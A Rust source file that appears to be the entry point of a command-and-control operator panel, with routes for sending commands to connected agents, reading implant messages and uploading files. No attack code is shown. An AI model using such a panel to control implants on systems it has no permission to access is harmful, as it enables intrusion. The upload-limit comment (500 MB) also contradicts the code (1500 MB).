use std::{net::SocketAddr, sync::Arc};

use axum::{
    Router,
    extract::DefaultBodyLimit,
    routing::{get, post},
    serve,
};
use tower_http::services::ServeDir;

use crate::{
    api::{
        dashboard::{
            close_tab, draw_tabs, poll_connected_agents, select_agent_tab, select_agent_tab_idx,
            send_command, show_implant_messages,
        },
        file_upload::upload_file_api,
        login::try_login,
        pages::{serve_dash, serve_login, upload_file_page},
    },
    models::AppState,
};

mod api;
mod models;
mod net;
mod tasks;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    //
    // Environment setup
    //

    dotenvy::dotenv()
        .expect("dotenv file must be present and must contain admin token, refer to docs.");

    let static_files = ServeDir::new("static");

    let state = Arc::new(AppState::new());

    //
    // Build the routes
    //

    let app = Router::new()
        .route("/", get(serve_login))
        .route("/dashboard", get(serve_dash))
        .route("/file_upload", get(upload_file_page))
        //
        // APIs
        //
        .route("/api/do_login", post(try_login))
        .route("/api/dashboard/send_command", post(send_command))
        .route("/api/dashboard/poll_agents", get(poll_connected_agents))
        .route("/api/dashboard/get_tabs", get(select_agent_tab))
        .route("/api/dashboard/get_tabs_id", get(select_agent_tab_idx))
        .route("/api/dashboard/draw_tabs", get(draw_tabs))
        .route("/api/dashboard/close_tab", post(close_tab))
        .route("/api/dashboard/show_messages", get(show_implant_messages))
        .route("/api/upload_file", post(upload_file_api))
        //
        // Static content
        //
        .nest_service("/static", static_files)
        // Max upload sz of 500 MB
        .layer(DefaultBodyLimit::max(1500 * 1024 * 1024))
        .with_state(state.clone());

    //
    // Serve the app
    //

    let listener = tokio::net::TcpListener::bind("127.0.0.1:4040").await?;

    serve(
        listener,
        app.into_make_service_with_connect_info::<SocketAddr>(),
    )
    .await?;

    Ok(())
}
